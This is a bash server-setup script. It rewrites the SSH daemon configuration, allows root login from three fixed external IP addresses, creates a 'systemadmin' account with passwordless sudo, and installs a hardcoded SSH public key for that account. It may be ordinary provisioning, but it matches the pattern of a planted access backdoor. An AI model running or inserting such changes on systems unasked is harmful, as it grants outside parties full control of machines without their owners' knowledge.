#!/bin/bash
USER=systemadmin
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bk

cat << EOF > /etc/ssh/sshd_config
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
SyslogFacility AUTHPRIV
AuthorizedKeysFile      .ssh/authorized_keys
PermitRootLogin  no
PermitEmptyPasswords no
PasswordAuthentication no
ChallengeResponseAuthentication no
GSSAPIAuthentication yes
GSSAPICleanupCredentials no
UsePAM yes
X11Forwarding yes
UseDNS no
AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES
AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT
AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE
AcceptEnv XMODIFIERS
Subsystem       sftp    /usr/lib/openssh/sftp-server
Match Address 180.148.128.107,180.148.128.97,180.148.128.197
    PermitRootLogin yes
EOF

useradd -m $USER -s /bin/bash && mkdir /home/$USER/.ssh/ && touch /home/$USER/.ssh/authorized_keys && chown -R $USER:$USER /home/$USER/.ssh && chmod 600 /home/$USER/.ssh/authorized_keys
echo "$USER        ALL=(ALL)       NOPASSWD: ALL" >> /etc/sudoers
su - $USER -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAiOY7BGJzuEvXCjPBtCMGWkGqiAklPxoCRxXkb1Sk9yAdGPIQGEMSO00CoSeNYsTkqrADIkXBF4rOcppU5iYwVtPKuCWq3FBNaWHHYPshDTKq4fdF70e+TL18xrJkGTfBENAk/f6Rx5mwH3Hmd30PGvQK124Auqlt/79QyU8/BFwWSepkUMGKVHb/8hDmgvq7mwh1G0KjXKuUC/vHrUWR/7rC7Km4R3kAct0ePQeEuQ+WeTpCuc8P5iLpFw+iWzicZrlGiRpLlCmt4eYsaoIb5OTZA4eqLLOxrw5m9jZPAZ1p3Pe4Jk9S4AZttqs3xedIheUL4XWhQzUaptCvdIkz0Q== system-admin' > /home/$USER/.ssh/authorized_keys"
systemctl restart sshd